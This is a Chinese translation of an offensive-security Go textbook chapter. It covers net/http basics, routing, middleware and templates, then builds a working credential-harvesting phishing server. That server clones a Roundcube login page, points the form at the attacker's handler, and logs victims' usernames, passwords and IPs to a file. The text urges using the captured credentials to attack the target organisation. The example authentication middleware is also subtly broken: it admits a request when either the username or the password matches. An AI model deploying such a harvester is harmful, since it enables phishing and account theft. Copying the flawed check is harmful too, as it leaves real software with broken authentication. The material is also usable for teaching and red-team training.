## 摘要
如果您知道如何从零开始写HTTP服务器，就能够为社会工程，命令和控制（C2）传输，或者你自己的工具创建api和前端以及其他的内容创建自定义逻辑。幸运的是，Go有出色的标准包——`net/http`——构建HTTP服务；这是不仅仅是有效地写简单的服务所有需要的，以及复杂的、功能齐全的web应用程序所需要的。

除了标准包外，可以使用其他第三方包快速地开发和减少繁琐的程序，例如模式匹配。这些包有助于你使用路由，构建中间件，校验请求等。

本章中，首先探讨构建简单HTTP应用需要的技术。然后使用这些技术创建两个社会工程应用——凭证收集服务器和keylogging服务——和多路C2管道。

## HTTP服务的基础知识

本部分通过构建简单服务，路由，中间件来探讨`net/http`包和有用的第三方包。本章最后会扩展这些基础知识完成更多邪恶的示例。

### 构建简单的服务

代码4-1是启动了处理单个路由的服务。服务器根据`name`获取含有用户名的URL参数，并用定制的问候响应。
```go
package main

import (
	"fmt"
	"net/http"
)

func hello(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "Hello %s\n", r.URL.Query().Get("name"))
}

func main() {
	http.HandleFunc("/hello", hello)
	http.ListenAndServe(":8000", nil)
}
```
代码 4-1: Hello World 服务 (https://github.com/blackhat-go/bhg/ch-4/hello_world/main.go/)

该示例在`/hello`处公开资源，资源关联参数并将其值回传给客户端。`main()`函数内的`http.HandleFunc()`带有两个参数：一个是字符串，指示服务器寻找的URL路径模式，另一个是实际上处理请求的函数。如果愿意的话，可以使用匿名内联函数。本例中，使用的是早定义好的`hello()`函数。

`hello()`函数处理请求，并返回给客户端一个hello消息。该函数本身需要两个参数。第一个是`http.ResponseWriter`，用于给请求写入响应。第二个参数是`http.Request`指针，用于从收到的请求中读取信息。注意，在`main()`中没有调用`hello()`函数。仅仅告诉HTTP服务器对于`/hello`的任何请求都由`hello()`函数处理。

实际上，`http.HandleFunc()`是做了什么呢? Go文档中指出在`DefaultServerMux`上处理。`ServerMux`是`server multiplexer`的缩写，只是个花哨的说法，底层代码能够处理多个请求模式和函数。使用协成处理，收到的每一个请求开启一个协成。导入`net/http`包就创建了ServerMux，并附加在包的命名空间上，即`DefaultServerMux`。

下行代码调用`http.ListenAndServe() `，该函数采用一个字符串和一个`http.Handler`作为参数。使用第一个参数作为地址启动一个HTTP服务。在本例中是`:8000`，也就是在所有接口中监听8000端口。对于第二个参数，即`http.Handler`，传入的是`nil`。结果是使用`DefaultServerMux`在底层处理。马上就实现自己的`http.Handler`，然后出入。但目前仅使用默认的即可。也可以使用`http.ListenAndServeTLS()`，如名字所描述那样，其使用`HTTPS` 和 `TLS`开启服务，但是需要另外的参数。

实现`http.Handler`接口需要单个方法：``ServeHTTP(http.ResponseWriter, *http.Request)`。这很棒，因为简化了自定义HTTP服务的创建。会发现很多第三方的实现，通过添加特色来扩展`net/http`功能，如中间件，认证，响应编码等等。

可以使用`curl`来测试服务：
```shell script
$ curl -i http://localhost:8000/hello?name=alice 
HTTP/1.1 200 OK
Date: Sun, 12 Jan 2020 01:18:26 GMT 
Content-Length: 12
Content-Type: text/plain; charset=utf-8 

Hello alice
```
太好了!所构建的服务器读取URL中的`name`参数并使用问候语回复。

### 构建简单的路由

接下来构建简单的路由，如代码4-2所示。演示了如何通过检查URL路径来动态处理收到的请求。取决于URL是否含有路径`/a, /b, 或 /c`，打印出` Executing /a, Executing /b, 或 Executing /c`。其他的打印`404 Not Found`。
```go
package main

import (
	"fmt"
	"net/http"
)

type router struct {
}

func (r *router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	switch req.URL.Path {
	case "/a":
		fmt.Fprint(w, "Executing /a")
	case "/b":
		fmt.Fprint(w, "Executing /b")
	case "/c":
		fmt.Fprint(w, "Executing /c")
	default:
		http.Error(w, "404 Not Found", 404)
	}
}

func main() {
	var r router
	http.ListenAndServe(":8000", &r)
}
```
代码 4-2: 简单的路由 (https://github.com/blackhat-go/bhg/ch-4/simple_router/main.go/)

首先，定义了没有任何字段名为`router`的类型。用于实现`http.Handler`接口。为此，必须定义` ServeHTTP()`方法。该方法在请求的URL路径上使用一个`switch`语句，基于路径执行不同的逻辑。使用`404 Not Found`响应默认操作。在`main()`中，创建了一个`router`实例，并将指针传给`http.ListenAndServe()`。

在终端里执行下：
```shell script
$ curl http://localhost:8000/a
Executing /a
$ curl http://localhost:8000/d
404 Not Found
```

如期运行；程序对URL含`/a`路径的返回`Executing /a`，对不存在的路径返回`404 Not Found`响应。这是一个简单的例子。第三方路由会有更复杂的逻辑。但这应该能让你对它们的工作原理有一个基本的了解。

### 构建简单的中间件

现在来构建中间件，是一种执行所有传入的请求的包装，而不管目标函数是什么。代码4-3的例子中，将创建一个显示请求处理开始和结束时间的logger。
```go
package main

import (
	"fmt"
	"log"
	"net/http"
	"time"
)

type logger struct {
	Inner http.Handler
}

func (l *logger) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	log.Printf("start %s\n", time.Now().String())
	l.Inner.ServeHTTP(w, req)
	log.Printf("finish %s\n", time.Now().String())
}

func hello(w http.ResponseWriter, req *http.Request) {
	fmt.Fprint(w, "Hello\n")
}

func main() {
	f := http.HandlerFunc(hello)
	l := logger{Inner: f}
	http.ListenAndServe(":8000", &l)
}
```
代码 4-3: 简单的中间件 (https://github.com/blackhat-go/bhg/ch-4/simple_middleware/main.go/)

实际上是对于每个请求创建一个外部处理器，记录服务的一些信息，然后调用`hello()`函数。将日志逻辑到函数中。

如同简单的路由例子，定义了名为`logger`的新类型，但是这次带有一个`Inner`字段，其本身是`http.Handler`。在`ServeHTTP()`定义中，使用`log()`输出请求的开始和结束时间，在这之间调用内部的`ServeHTTP()`方法。对于客户端，请求会在内部的处理器结束。`main()`函数内，使用`http.HandlerFunc()`在函数外面创建了一个`http.Handler`。创建`logger`，给新创建的处理器设置`Inner`。最后，使用`logger`的指针启动服务。

运行代码，然后发送请求就好输出两个本次请求开始和结束时间的信息：
```shell script
$ go build -o simple_middleware
$ ./simple_middleware
2020/01/16 06:23:14 start
2020/01/16 06:23:14 finish
```
接下来的部分，深入研究中间件和路由，并使用我们喜欢的第三方包，其能创建更动态的路由和在链中执行中间件。我们还将讨论迁移到更复杂场景中的中间件的一些用例。


### 使用`gorilla/mux`包创建路由

如同代码4-2所示，通过路由将请求的路径匹配到函数。但是也可以用来将其他属性——HTTP方法或host头——与函数匹配。Go的生态中有几种第三方路由。这里介绍其中的一种：`gorilla/mux`。但就像其他事情一样，当遇到其他包时，我们鼓励通过研究来扩展知识。

`gorilla/mux`是个成熟的第三方包，支持简单和复杂模式的路由。包括正则表达式，模式匹配，方法匹配，和子路由，其他功能等。

通过几个简单的例子来看下如何使用该路由包。无需运行，因为很快就会在程序中使用它们，但是请随意尝试和试验。

使用`gorilla/mux`之前先安装：
```shell script
$ go get github.com/gorilla/mux
```
现在可以开始了。使用`mux.NewRouter()`创建路由：
```go
r := mux.NewRouter()
```

返回的类型实现了`http.Handler`，但是也有其他相关的方法。经常用的一个是`HandleFunc()`。举例，如果定义一个新路由处理对模式`/foo`的GET请求`，你可以这样使用：
```go
r.HandleFunc("/foo", func(w http.ResponseWriter, req *http.Request) {
    fmt.Fprint(w, "hi foo")
}).Methods("GET")
```
现在，因为调用了`Methods()`，该路由只匹配GET请求。对其他类型的请求返回404响应。还可以继续链接其他的限定，像`Host(string)`，匹配特定的host头。下面例子只匹配host头设置为`www.foo.com`的请求。
```go
r.HandleFunc("/foo", func(w http.ResponseWriter, req *http.Request) {
    fmt.Fprint(w, "hi foo")
}).Methods("GET").Host("www.foo.com")
```
有时，在请求路径中匹配并传递参数是很有帮助的（例如，实现RESTful API时）。使用`gorilla/mux`非常简单，下例将打印出请求路径中`/user/`后面的内容:
```go
r.HandleFunc("/users/{user}", func(w http.ResponseWriter, req *http.Request) {
    user := mux.Vars(req)["user"]
    fmt.Fprintf(w, "hi %s\n", user)
}).Methods("GET")
```
在路径定义中，使用大括号定义请求参数。可以将其看作一个已命名的占位符。然后，在处理函数内，调用`mux.Vars()`来解析请求体，返回`map[string] string`类型的数据，其值为请求的参数名字和各自的值。使用`user`作关键字。因此，`/users/bob`的请求就会产生对Bob的问候。
```shell script
$ curl http://localhost:8000/users/bob
hi bob
```
可以更进一步，使用正则表达式限定传递的模式。例如，可以限定user参数必须是小写字母：
```go
r.HandleFunc("/users/{user:[a-z]+}", func(w http.ResponseWriter, req *http.Request) {
    user := mux.Vars(req)["user"]
    fmt.Fprintf(w, "hi %s\n", user)
}).Methods("GET")
```
任何不匹配的模式现在都会返回404响应：
```shell script
$ curl -i http://localhost:8000/users/bob1 HTTP/1.1
404 Not Found
```
在下一节中，我们将扩展路由，包括一些使用其他库的中间件。这会增加处理HTTP请求的灵活性。

### 使用Negroni构建中间件

之前介绍的简单的中间件记录处理请求的开始和结束时间，然后返回响应。中间件无需对每个传入的请求都进行操作，且大多数情况下也都是这样的。使用中间件的理由很多，记录请求，身份认证，用户认证，映射资源。

例如，可以写个执行基础认证的中间件。能够解析每个请求的认证头，验证用户名和密码，如果凭据无效就返回401响应。还可以以这样的方式将多个中间件函数链接在一起使用，即在执行完一个后再运行下一个。对于本章前面创建的日志中间件，只封装了一个函数。实际上，不是很有用，因为要使用不止一个，为此，必须有可以在一个接一个的链中执行它们的逻辑。从零开始写也并不难，但是不用重复造轮子了。现在已经有成熟的包做到这一点了：`negroni`。

`negroni`，链接为`https://github.com/urfave /negroni/`，非常优秀，因为不是很大的框架。在其他框架中也很容易使用，也非常灵活。还附带了对程序都很有用的默认中间件。在使用之前先获取：
```shell script
$ go get github.com/urfave/negroni
```

虽然在技术上可以将negroni用于所有应用程序逻辑，但这样做并不理想，因为它是专门为充当中间件而构建的，并不是路由。相反，最好将`negroni`和其他包结合使用，如`gorilla/mux`或`net/http`。让我们使用`gorilla/mux`来构建个程序，再熟悉下`negroni`，并在他们穿越中间件练时能可视化操作的顺序。

首先，在一个目录中创建名为`main.go`的新文件，如`github.com/blackhat-go/bhg/ch-4/negroni _example/`。（在克隆BHG Github仓库时，已经创建了这个目录。）现在将下面的代码加到`main.go`文件中。
```go
package main

import (
    "net/http"

    "github.com/gorilla/mux"
    "github.com/urfave/negroni"
)

func main() {
    r := mux.NewRouter()
    n := negroni.Classic()
    n.UseHandler(r)
    http.ListenAndServe(":8000", n)
}
```
代码 4-4: Negroni 例子 (https://github.com/blackhat-go/bhg/ch-4/negroni_example/main.go/)

首先，像本章之前那样调用`mux.NewRouter()`来创建路由。接下来是和`negroni`第一次交互：调用`negroni.Classic()`。创建了一个Negroni实例的指针。

可以使用不同的方式。既可以使用 `negroni.Classic()`，也可以调用`negroni.New()`。第一个，`negroni.Classic()`，设置默认中间件，包括请求日志，被拦截和panic时恢复中间件，在同一目录中从公用文件夹中提供文件的中间件。`negroni.New()`函数不会创建任何默认的中间件。

在`negroni`包中，每种类型的中间件都是可用的。例如，可以通过下面的步骤使用恢复包:
```go
n.Use(negroni.NewRecovery())
```

接下来，通过调用`n.UseHandler(r)`将路由添加到中间件上。当继续规划和构建中间件时，考虑下执行顺序。例如，认证中间件要在需要认证的处理函数之前执行。在路由之前的中间件要先处理函数之前执行；在路由之后的中间件要在处理函数之后执行。顺序很重要。本例中，还没有定义任何中间件，但很快就会了。

继续编译之前创建的代码4-4，然后运行。然后向服务监听的地址`http://localhost:8000`发送web请求。`negroni`日志中间件就好输出下面的信息。输出带有时间戳，响应码，处理时间，host，和HTTP方法。
```shell script
$ go build -s negroni_example
$ ./negroni_example
[negroni] 2020-01-19T11:49:33-07:00 | 404 | 1.0002ms | localhost:8000 | GET
```

有默认中间件非常好，但真正的能力是构建自己的中间件。使用`negroni`调用几个方法就能添加中间件。看一下下面的代码。其创建了`trivial`中间件，打印信息，然后将执行传递给链中的下一个中间件:
```go
type trivial struct {
}
func (t *trivial) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
    fmt.Println("Executing trivial middleware")
    next(w, r)
}
```

这里的实现和之前的例子有点不一样。之前实现了`http.Handler`接口，`ServeHTTP()`方法接收两个参数：`http.ResponseWriter`和` *http.Request`。在本例中，实例`negroni.Handler`接口来替换了` http.Handler`接口。稍微不同的地方是`negroni.Handler`接口要实现`ServeHTTP()`方法，其接收的参数不是两个，而是三个：`http.ResponseWriter`, `*http.Request`, 和 `http.HandlerFunc`。`http.HandlerFunc`这个参数用来指示链中的下一个中间件函数。便于理解将其命名为`next`。在`ServeHTTP()`中处理，然后调用`next()`。传递原先接收到的`http.ResponseWriter`和`*http.Request`的值。这有效地将执行向下转移。

但是仍然要让`negroni`知道将您的实现作为中间件链的一部分。通过调用negroni的`Use`方法，并传递实现的`negroni.Handler`实例就可以了：
```go
n.Use(&trivial{})
```

使用这种简便的方法来写自己的中间件，因为这很容易地将执行传递给下一个中间件。缺点是：必须使用`negroni`。举个例子，如果写了个给响应添加安全头的中间件，希望其实现`http.Handler`，因此可以在其他的应用中复用，又由于多数的应用没有negroni.Handler。关键是，不管中间件的用途是什么，当在在无`negroni`应用中使用negroni中间件时可能会出现兼容性问题，反之亦然。

有两种方式告诉`negroni`使用你的中间件。`UseHandler (handler http.Handler)`，已经非常熟悉了，这是第一种。第二种是调用` UseHandleFunc(handlerFunc func(w http.ResponseWriter, r *http.Request))`。后者不经常使用，不允许放弃执行链中的下一个中间件。举例，如果写了个执行认证的中间件，如果有任何凭证或session信息无效的话就直接返回401响应；使用第二种方式的话不可能实现的。

### 使用Negroni添加认证

在继续之前，先来修改下上个例子来演示下如何使用上下文。上下文非常容易地在两个函数间传递变量。代码4-5中的例子使用了`negroni`添加认证中间件。
```go
package main

import (
	"context"
	"fmt"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/urfave/negroni"
)

type badAuth struct {
	Username string
	Password string
}

func (b *badAuth) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	username := r.URL.Query().Get("username")
	password := r.URL.Query().Get("password")
	if username != b.Username && password != b.Password {
		http.Error(w, "Unauthorized", 401)
		return
	}
	ctx := context.WithValue(r.Context(), "username", username)
	r = r.WithContext(ctx)
	next(w, r)
}

func hello(w http.ResponseWriter, r *http.Request) {
	username := r.Context().Value("username").(string)
	fmt.Fprintf(w, "Hi %s\n", username)
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/hello", hello).Methods("GET")
	n := negroni.Classic()
	n.Use(&badAuth{
		Username: "admin",
		Password: "password",
	})
	n.UseHandler(r)
	http.ListenAndServe(":8000", n)
}

```
代码 4-5: 在处理函数中使用上下文 (https://github.com/blackhat-go/bhg/ch-4/negroni_example/main.go/)

添加了个新的中间件，`badAuth`，进行简单的认证，纯粹是演示用。其有两个字段`Username`和`Password`，并实现了`negroni.Handler`，因为定义了之前讨论过的带有三个参数的`ServeHTTP()`。在`ServeHTTP()`方法内，先从请求中获取username和password，然后和原值比较。如果username或password不正确就停止执行，然后返回401响应。

需注意的是在调用`next()`之前返回。这样链中剩余的中间件才不会执行。如果凭证正确的话，学习下将username添加到请求上下文这一详细过程。首先调用`context.WithValue()`初始化请求上下文，在上下文中设置变量名username。然后调用`r.WithContext(ctx)`确保请求使用新的上下文。如果打算用Go写web程序，会对这种模式非常熟悉，因为会经常用到。

`hello()`函数中，通过使用`Context().Value(interface{})`函数从请求上下文中获取username，该函数返回`interface{}`。由于已经知道是个字符串类型，这里就可以对类型强转。如果不能断定类型，或不确定上下文中是否有该值的话，使用`switch`处理。

编译并执行代码4-5，然后发送带有正确和错误凭证的请求。会看到下面的输出：
```shell script
$ curl -i http://localhost:8000/hello
HTTP/1.1 401 Unauthorized
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Thu, 16 Jan 2020 20:41:20 GMT
Content-Length: 13
Unauthorized
$ curl -i 'http://localhost:8000/hello?username=admin&password=password'
HTTP/1.1 200 OK
Date: Thu, 16 Jan 2020 20:41:05 GMT
Content-Length: 9
Content-Type: text/plain; charset=utf-8

Hi admin
```

使用不带凭证的请求导致中间件返回401认证错误。使用有效的凭据发送同一请求，会生成只有经过身份验证的用户才能访问到的超级机密问候语消息。

需要学习的东西太多了。到目前为止，处理函数中仅仅使用`fmt.FPrintf() `向`http.ResponseWriter`实例写入响应。下一部分，学习使用Go的模板包更动态的返回HTML的方法。

### 使用模板生成HTML响应

`Templates`使用Go中的变量动态地生成内容，包括HTML。很多语言都有生成模板的第三方包。Go有两个模板包：`text/template`和 `html/template`。本章使用HTML这个包，这符合需要的上下文编码。

Go包的一个奇妙之处在于它是上下文感知的：根据变量在模板中的位置对变量进行不同的编码。举例，如果字符串作为href属性的URL，字符串就会被URL编码，但是相同的字符串在HTML元素中就会被HTML编码。

要想创建并使用模板，首先要定义模板，其中包含占位符来指示要呈现的动态上下文数据。这种语法对使用过Paython的Jinja的人非常熟悉。渲染模板时，会传递一个变量将用作此上下文。该变量既可以是有多个字段的复杂结构，也可以是个简单的变量。

让我们来看下代码4-6这个例子，这是使用JavaScript创建的简单模板并生成占位符。这是个精心设计的示例来演示如何动态填充返回到浏览器的内容。
```go
package main

import (
	"html/template"
	"os"
)

var x = `
<html>
  <body>
    Hello {{.}}
  </body>
</html>
`

func main() {
	t, err := template.New("hello").Parse(x)
	if err != nil {
		panic(err)
	}
	t.Execute(os.Stdout, "<script>alert('world')</script>")
}
```
代码 4-6: HTML 模板 (https://github.com/blackhat-go/bhg/ch-4/template_example/main.go/)

做的第一件事是创建变量`x`来存储HTML模板。这里使用内嵌到代码中的字符串定义模板，但是大多数情况下需要将模板保存为文件。注意，该模板只是个简单的HTML页面。在模板内，使用{{variable-name}}这种约定来定义占位符，`variable-name`所在的地方是上下文数据中将要渲染的数据元素。记住，这可以是一个结构或其他简单的数据。本例中使用了一个点，即渲染整个上下文。如果使用单个字符串的话，这是可以的，但是有一个很大很复杂的数据结构，如结构体，通过这个点就能取到需要的字段。例如，传递给模板一个带有`Username`字段的结构体，通过使用`{{.Username}}`就能渲染该字段。

接下来，在`main()`函数中，通过调用`template.New(string)`创建一个新模板。然后调用`Parse(string)`确保是正确的模板模式，并对其解析。这两个函数一起使用返回了个`Template`类型的指针。

虽然本例只使用一个模板，但是可以将模板嵌入到其他模板中。在使用多个模板时，为了能够调用它们，对它们进行命名是很重要的。最后，调用`Execute(io.Writer, interface{})`，通过传入的参数处理模板后作为第二个参数，然后将其写入到前面的`io.Writer`中。这里使用`os.Stdout`只是为了演示用。传给`Execute()`的第二个参数是用于渲染模板的上下文。

运行代码查看生成的 HTML，应该会注意到作为上下文的一部分所的脚本标记和单引号字符被正确编码了。Neat-o!
```shll
$ go build -o template_example $ ./template_example
<html>
  <body>
    Hello &lt;script&gt;alert(&#39;world&#39;)&lt;/script&gt;
  </body>
</html>
```

关于模板多说一些。可以使用逻辑运算符;可以与循环和其他控制结构一起使用。可以调用内置函数，甚至能定义和暴露出任意的函数能大大地扩展模板功能。Double neat-o! 最好能深入研究这些可行性。已经超出了本书的内容，但真的很强大。

如何摆脱创建服务器和处理请求的基础知识，而是专注于更邪恶的事情。让我们来创建一个凭据收割机吧！

## 凭据收割机

社会工程的主要内容之一是`credential-harvesting attack`。这种类型的攻击通过钓鱼的方式收集用户在某个网站的登录信息。这种攻击对于网上使用单个身份验证接口的组织非常有用。一旦获取到用户的凭证，就能登录到原网站访问其账户。这通常会导致该组织的外围网络遭到初步破坏。

对于这种类型的攻击，Go是非常棒的平台，因为能快速创建服务，因为非常容易地配置路由来解析用户的输入。可以向凭证收集服务添加更多的定制功能。但是本例，我们仍然学习基础。

首先，需要克隆具有登录表单的站点。这有很多的方法。实际上，更望克隆正在使用的站点。不过，本例克隆Roundcube站点。`Roundcube`是个开源的web邮件客户端，不像商业软件那样常用，例如Microsoft Exchange，但是幸好也能让我们阐明这些概念。使用Docker 来运行 Roundcube，因为会更简单些。

执行下面的命令就能启动自己的Roundcube服务。如果不想运行Roundcube服务也不要担心，实战源代码也有一个站点的克隆。不过，为了完整起见，我们还是加上了这个:
```shell script
$ docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube
```
该命令启动了一个Roundcube的Docker实例。如果浏览http://127.0.0.1:80的话，会看到一个登录表单。通常情况下，用`wget`克隆一个站点和所有该站点所需要的文件，但是Roundcube使用的是JavaScript，可以防止这种情况发生。但是，可以使用Google Chrome来保存。在实战目录下，会看到一个文件夹的结构如代码4-7所示：
```shell script
$ tree
.
+-- main.go
+-- public
    +-- index.html
    +-- index_files
        +-- app.js
        +-- common.js
        +-- jquery-ui-1.10.4.custom.css
        +-- jquery-ui-1.10.4.custom.min.js
        +-- jquery.min.js
        +-- jstz.min.js
        +-- roundcube_logo.png
        +-- styles.css
        +-- ui.js
    index.html
```
代码 4-7: https://github.com/blackhat-go/bhg/ch-4/credential_harvester/ 文件夹结构

`public`目录中的文件表示未更改的克隆登录站点。需要修改原始的登录表单来重定向输入的凭证，将它们发送给自己的服务而不是之前那个合法的服务。开始，打开`public/index.html`并找到使用POST发送登录请求的表单元素。应该看起来像下面这样：
```html
<form name="form" method="post" action="http://127.0.0.1/?_task=login">
```
需要将标签为`action`的属性更改为自己的服务地址。将`action`改为`/login`并保存。现在该行看起来像下面这样：
```html
<form name="form" method="post" action="/login">
```

首先需要提供`public`目录中的文件，才能正确的渲染登录表单和捕获username和password。然后需要为`/login`写个`HandleFunc`来捕获username和password。还希望将捕获的凭证存储在文件中，并进行详细的日志记录。

只需几十行代码就可以处理所有的这些问题。代码4-8是该程序的完整代码。
```go
package main

import (
	"net/http"
	"os"
	"time"

	log "github.com/Sirupsen/logrus"
	"github.com/gorilla/mux"
)

func login(w http.ResponseWriter, r *http.Request) {
	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("_user"),
		"password":   r.FormValue("_pass"),
		"user-agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempt")
	http.Redirect(w, r, "/", 302)
}

func main() {
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()
	log.SetOutput(fh)
	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8080", r))
}
```
代码 4-8: Credential-harvesting 服务 (https://github.com/blackhat-go/bhg/ch-4/credential_harvester/ main.go/)

值得注意的第一件事是导入`github.com/Sirupsen/logrus`包。这是一个日志包，用来代替Go的`log`包。该包支持更多的日志配置选型来更好地处理错误。使用该包前需要先运行`go get`获取。

下一步，定义`login()`处理函数。希望这是个熟悉的模式。在该函数里，使用` log.WithFields() `记录捕获的数据。显示当前时间，请求者的用户带来，IP地址。也调用`FormValue(string)`捕获提交的`username (_user)`和`password (_pass)`的值。从`index.html `中获取这些值，并且通过定位表单的输入元素来查找`username`和`password`。服务需要明确地与存在于登录表单中的字段名称保持一致。

下面的片段是从`index.html`中提取的，显示相关的输入项，为了清晰起见元素名称加粗:
 ```html
<td class="input"><input name="_user" id="rcmloginuser" required="required" size="40" autocapitalize="off" autocomplete="off" type="text"></td>
<td class="input"><input name="_pass" id="rcmloginpwd" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
 ```

 在`main()`函数中，先打开文件用来保存捕获的数据，然后使用`log.SetOutput(io.Writer)`，传入刚创建的文件柄来配置日志，以便将数据写到文件中。接下来创建新路由，并加上处理函数`login()`。

 启动服务之前，还要做一件看起来陌生的事情：告诉路由支持文件夹里的静态文件。这样Go服务就好明确地知道静态文件（图像， JavaScript，HTML）的位置。Go简化了这一过程，并提供了针对遍历目录攻击的保护。由里而外，使用`http.Dir(string)`定义希望提供文件的目录。然后将其传入到`http.FileServer(FileSystem)`，这样就为该目录创建了一个`http.Handler`。使用`PathPrefix(string)`将其加到路由上。使用`/`作为路径前缀来匹配任何尚未找到匹配的请求。注意，默认情况下从`FileServer`返回的处理器支持目录索引。这可能会泄露某些信息。当然也可以将其禁用，但是这里先不涉及了。

 最后，像之前那样启动服务。构建并执行代码4-8中的代码之后，打开浏览器并浏览`http://localhost:8080`。尝试在表单中提交`username 和 password`。然后回到终端退出程序，查看`credentials.txt`显示如下：
 ```shell script
$ go build -o credential_harvester
$ ./credential_harvester
^C
$ cat credentials.txt
INFO[0038] login attempt
ip_address="127.0.0.1:34040" password="p@ssw0rd1!" time="2020-02-13 21:29:37.048572849 -0800 PST" user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0" username=bob
 ```

 看看这些日志！可以看到用户名为bob，密码为p@ssw0rd1!。恶意的服务成功地处理了POST表单，捕获到输入的凭证，并保存到能离线查看的文件中。作为攻击者，您可以尝试针对目标组织使用这些凭证，并继续进行进一步的攻击。

 在下一节中，将学习这种凭证收集技术的变体。不是等待表单提交，而是创建键盘记录器来实时捕获按键。

 

